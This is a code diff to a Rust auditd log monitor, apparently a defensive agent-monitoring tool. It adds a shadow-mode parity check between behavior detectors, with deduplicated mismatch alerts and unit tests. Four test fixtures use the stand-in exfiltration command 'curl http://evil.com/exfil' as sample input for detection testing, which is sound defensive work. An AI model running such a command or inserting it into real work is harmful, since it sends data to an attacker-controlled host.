@@ -14,7 +14,8 @@ use std::io::{BufRead, BufReader};
 use std::fs::File;
 use std::os::unix::fs::MetadataExt;
 use std::path::Path;
-use std::sync::Arc;
+use std::sync::{Arc, Mutex, OnceLock};
+use std::time::Instant;
 use tokio::sync::mpsc;
 
 /// Recommended auditd rules for ClawTower monitoring.
@@ -58,6 +59,52 @@ pub const RECOMMENDED_AUDIT_RULES: &[&str] = &[
 ];
 
 use crate::alerts::{Alert, Severity};
+use crate::detect::traits::{AlertProposal, DetectionEvent, Detector};
+
+const PARITY_DEDUP_WINDOW_SECS: u64 = 30;
+
+#[allow(dead_code)]
+#[derive(Debug, Clone, Default)]
+pub struct ParityStatsSnapshot {
+    pub mismatches_total: u64,
+    pub alerts_emitted: u64,
+    pub alerts_suppressed: u64,
+}
+
+#[derive(Debug, Default)]
+struct ParityState {
+    last_key: Option<String>,
+    last_emit_at: Option<Instant>,
+    mismatches_total: u64,
+    alerts_emitted: u64,
+    alerts_suppressed: u64,
+}
+
+static PARITY_STATE: OnceLock<Mutex<ParityState>> = OnceLock::new();
+
+fn parity_state() -> &'static Mutex<ParityState> {
+    PARITY_STATE.get_or_init(|| Mutex::new(ParityState::default()))
+}
+
+#[allow(dead_code)]
+pub fn parity_stats_snapshot() -> ParityStatsSnapshot {
+    let state = parity_state()
+        .lock()
+        .expect("parity state mutex poisoned");
+    ParityStatsSnapshot {
+        mismatches_total: state.mismatches_total,
+        alerts_emitted: state.alerts_emitted,
+        alerts_suppressed: state.alerts_suppressed,
+    }
+}
+
+#[cfg(test)]
+fn reset_parity_stats_for_tests() {
+    let mut state = parity_state()
+        .lock()
+        .expect("parity state mutex poisoned");
+    *state = ParityState::default();
+}
 
 /// Whether the event originated from the autonomous agent or a human operator
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -559,6 +606,126 @@ pub fn event_to_alert(event: &ParsedEvent) -> Alert {
     Alert::new(severity, "auditd", &format!("{}{}", actor_tag, msg))
 }
 
+fn severity_label(severity: &Severity) -> &'static str {
+    match severity {
+        Severity::Critical => "critical",
+        Severity::Warning => "warning",
+        Severity::Info => "info",
+    }
+}
+
+fn parsed_event_to_detection_event(event: &ParsedEvent) -> DetectionEvent {
+    let mut fields = std::collections::HashMap::new();
+    fields.insert("syscall_name".to_string(), event.syscall_name.clone());
+    fields.insert("success".to_string(), event.success.to_string());
+    if let Some(cmd) = &event.command {
+        fields.insert("command".to_string(), cmd.clone());
+    }
+    if !event.args.is_empty() {
+        if let Ok(args_json) = serde_json::to_string(&event.args) {
+            fields.insert("args".to_string(), args_json);
+        }
+    }
+    if let Some(path) = &event.file_path {
+        fields.insert("file_path".to_string(), path.clone());
+    }
+    if let Some(ppid_exe) = &event.ppid_exe {
+        fields.insert("ppid_exe".to_string(), ppid_exe.clone());
+    }
+    let actor = match event.actor {
+        Actor::Agent => "agent",
+        Actor::Human => "human",
+        Actor::Unknown => "unknown",
+    };
+    fields.insert("actor".to_string(), actor.to_string());
+
+    DetectionEvent {
+        source: "auditd".to_string(),
+        event_type: event.syscall_name.clone(),
+        fields,
+        raw: Some(event.raw.clone()),
+    }
+}
+
+fn behavior_baseline_signature(event: &ParsedEvent) -> Option<(String, String)> {
+    crate::behavior::classify_behavior(event)
+        .map(|(category, severity)| (category.to_string().to_lowercase(), severity_label(&severity).to_string()))
+}
+
+fn behavior_proposal_signature(proposals: &[AlertProposal]) -> Option<(String, String)> {
+    proposals
+        .iter()
+        .find(|p| p.source == "behavior")
+        .map(|p| {
+            let category = p
+                .rule_id
+                .strip_prefix("behavior.")
+                .unwrap_or(&p.rule_id)
+                .to_string();
+            (category, p.severity.to_lowercase())
+        })
+}
+
+fn shadow_parity_alert(
+    event: &ParsedEvent,
+    shadow_mode: bool,
+    detectors: &[Box<dyn Detector>],
+) -> Option<Alert> {
+    if !shadow_mode {
+        return None;
+    }
+
+    let baseline = behavior_baseline_signature(event);
+    let shadow_event = parsed_event_to_detection_event(event);
+    let proposals = crate::runtime::detector_runner::run_detectors(detectors, &shadow_event);
+    let shadow = behavior_proposal_signature(&proposals);
+
+    if baseline == shadow {
+        return None;
+    }
+
+    let mismatch_key = format!(
+        "event={} baseline={:?} shadow={:?}",
+        event.syscall_name, baseline, shadow
+    );
+
+    {
+        let mut state = parity_state()
+            .lock()
+            .expect("parity state mutex poisoned");
+        state.mismatches_total += 1;
+
+        let now = Instant::now();
+        if state.last_key.as_deref() == Some(mismatch_key.as_str()) {
+            if let Some(last) = state.last_emit_at {
+                if now.duration_since(last).as_secs() < PARITY_DEDUP_WINDOW_SECS {
+                    state.alerts_suppressed += 1;
+                    return None;
+                }
+            }
+        }
+
+        state.last_key = Some(mismatch_key);
+        state.last_emit_at = Some(now);
+        state.alerts_emitted += 1;
+    }
+
+    let evidence = event
+        .command
+        .as_deref()
+        .or(event.file_path.as_deref())
+        .unwrap_or(&event.syscall_name);
+
+    Some(Alert::new(
+        Severity::Info,
+        "parity:behavior",
+        &format!(
+            "Behavior parity mismatch baseline={:?} shadow={:?} event={} evidence={}",
+            baseline, shadow, event.syscall_name, evidence
+        ),
+    ))
+}
+
 /// Legacy parse function — now wraps parse_to_event + event_to_alert
 #[allow(dead_code)]
 pub fn parse_audit_line(line: &str, watched_users: Option<&[String]>) -> Option<Alert> {
@@ -670,7 +837,7 @@ pub async fn tail_audit_log_with_behavior_and_policy(
     policy_engine: Option<crate::policy::PolicyEngine>,
     secureclaw_engine: Option<Arc<crate::secureclaw::SecureClawEngine>>,
 ) -> Result<()> {
-    tail_audit_log_full(path, watched_users, tx, policy_engine, secureclaw_engine, None, vec![]).await
+    tail_audit_log_full(path, watched_users, tx, policy_engine, secureclaw_engine, None, vec![], false).await
 }
 
 /// Tail audit log with full detection: behavior, policy, SecureClaw, and network policy.
@@ -687,6 +854,7 @@ pub async fn tail_audit_log_full(
     secureclaw_engine: Option<Arc<crate::secureclaw::SecureClawEngine>>,
     _netpolicy: Option<crate::netpolicy::NetPolicy>,
     _extra_safe_hosts: Vec<String>,
+    behavior_shadow_mode: bool,
 ) -> Result<()> {
     use std::io::{Seek, SeekFrom};
     use tokio::time::{sleep, Duration};
@@ -703,6 +871,12 @@ pub async fn tail_audit_log_full(
     let mut discard = String::new();
     let _ = reader.read_line(&mut discard);
     let mut line = String::new();
+
+    let shadow_detectors: Vec<Box<dyn Detector>> = if behavior_shadow_mode {
+        vec![Box::new(crate::detect::behavior_adapter::BehaviorDetector::new())]
+    } else {
+        vec![]
+    };
 
 
     // Periodic auditd rule reload to fix inode staleness.
@@ -758,6 +932,9 @@ pub async fn tail_audit_log_full(
                                         if let Some(tamper_alert) = check_tamper_event(&event) {
                                             let _ = tx.send(tamper_alert).await;
                                         }
+                                        if let Some(parity_alert) = shadow_parity_alert(&event, behavior_shadow_mode, &shadow_detectors) {
+                                            let _ = tx.send(parity_alert).await;
+                                        }
                                         if let Some(ref engine) = policy_engine {
                                             if let Some(verdict) = engine.evaluate(&event) {
                                                 let msg = format!("[POLICY:{}] {}", verdict.rule_name, verdict.description);
@@ -798,6 +975,10 @@ pub async fn tail_audit_log_full(
                     // Check for ClawTower tamper events (highest priority — fires for all users)
                     if let Some(tamper_alert) = check_tamper_event(&event) {
                         let _ = tx.send(tamper_alert).await;
+                    }
+
+                    if let Some(parity_alert) = shadow_parity_alert(&event, behavior_shadow_mode, &shadow_detectors) {
+                        let _ = tx.send(parity_alert).await;
                     }
 
                     // Run policy engine first (if available)
@@ -869,6 +1050,16 @@ pub async fn tail_audit_log_full(
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::detect::behavior_adapter::BehaviorDetector;
+    use crate::detect::traits::{AlertProposal, DetectionEvent, Detector};
+
+    struct AlwaysEmptyDetector;
+
+    impl Detector for AlwaysEmptyDetector {
+        fn id(&self) -> &'static str { "always-empty" }
+        fn version(&self) -> &'static str { "test" }
+        fn evaluate(&self, _event: &DetectionEvent) -> Vec<AlertProposal> { vec![] }
+    }
 
     #[test]
     fn test_syscall_name_lookup() {
@@ -1614,5 +1805,93 @@ mod tests {
         assert_eq!(alert.severity, Severity::Critical);
         assert!(alert.message.contains("Crypto wallet access"));
         assert!(alert.message.contains("/usr/bin/cat"));
+    }
+
+    #[test]
+    fn test_shadow_parity_no_mismatch_when_behavior_matches() {
+        let event = ParsedEvent {
+            syscall_name: "execve".to_string(),
+            command: Some("curl http://evil.com/exfil".to_string()),
+            args: vec!["curl".to_string(), "http://evil.com/exfil".to_string()],
+            file_path: None,
+            success: true,
+            raw: String::new(),
+            actor: Actor::Unknown,
+            ppid_exe: None,
+        };
+
+        let detectors: Vec<Box<dyn Detector>> = vec![Box::new(BehaviorDetector::new())];
+        reset_parity_stats_for_tests();
+        let parity = shadow_parity_alert(&event, true, &detectors);
+        assert!(parity.is_none(), "matching behavior + shadow output should not emit parity alert");
+    }
+
+    #[test]
+    fn test_shadow_parity_emits_alert_on_mismatch() {
+        let event = ParsedEvent {
+            syscall_name: "execve".to_string(),
+            command: Some("curl http://evil.com/exfil".to_string()),
+            args: vec!["curl".to_string(), "http://evil.com/exfil".to_string()],
+            file_path: None,
+            success: true,
+            raw: String::new(),
+            actor: Actor::Unknown,
+            ppid_exe: None,
+        };
+
+        reset_parity_stats_for_tests();
+        let detectors: Vec<Box<dyn Detector>> = vec![Box::new(AlwaysEmptyDetector)];
+        let parity = shadow_parity_alert(&event, true, &detectors);
+        assert!(parity.is_some(), "mismatch should emit parity diagnostic alert");
+        let alert = parity.expect("checked is_some");
+        assert_eq!(alert.source, "parity:behavior");
+        assert!(alert.message.contains("mismatch") || alert.message.contains("Mismatch") || alert.message.contains("baseline"));
+    }
+
+    #[test]
+    fn test_shadow_parity_disabled_emits_no_alert() {
+        let event = ParsedEvent {
+            syscall_name: "execve".to_string(),
+            command: Some("curl http://evil.com/exfil".to_string()),
+            args: vec!["curl".to_string(), "http://evil.com/exfil".to_string()],
+            file_path: None,
+            success: true,
+            raw: String::new(),
+            actor: Actor::Unknown,
+            ppid_exe: None,
+        };
+
+        reset_parity_stats_for_tests();
+        let detectors: Vec<Box<dyn Detector>> = vec![Box::new(AlwaysEmptyDetector)];
+        let parity = shadow_parity_alert(&event, false, &detectors);
+        assert!(parity.is_none(), "disabled shadow mode should not emit diagnostics");
+    }
+
+    #[test]
+    fn test_shadow_parity_dedup_suppresses_repeated_mismatch() {
+        let event = ParsedEvent {
+            syscall_name: "execve".to_string(),
+            command: Some("curl http://evil.com/exfil".to_string()),
+            args: vec!["curl".to_string(), "http://evil.com/exfil".to_string()],
+            file_path: None,
+            success: true,
+            raw: String::new(),
+            actor: Actor::Unknown,
+            ppid_exe: None,
+        };
+
+        reset_parity_stats_for_tests();
+        let detectors: Vec<Box<dyn Detector>> = vec![Box::new(AlwaysEmptyDetector)];
+
+        let first = shadow_parity_alert(&event, true, &detectors);
+        assert!(first.is_some(), "first mismatch should emit parity alert");
+
+        let second = shadow_parity_alert(&event, true, &detectors);
+        assert!(second.is_none(), "repeated mismatch in dedup window should be suppressed");
+
+        let stats = parity_stats_snapshot();
+        assert_eq!(stats.mismatches_total, 2);
+        assert_eq!(stats.alerts_emitted, 1);
+        assert_eq!(stats.alerts_suppressed, 1);
     }
 }
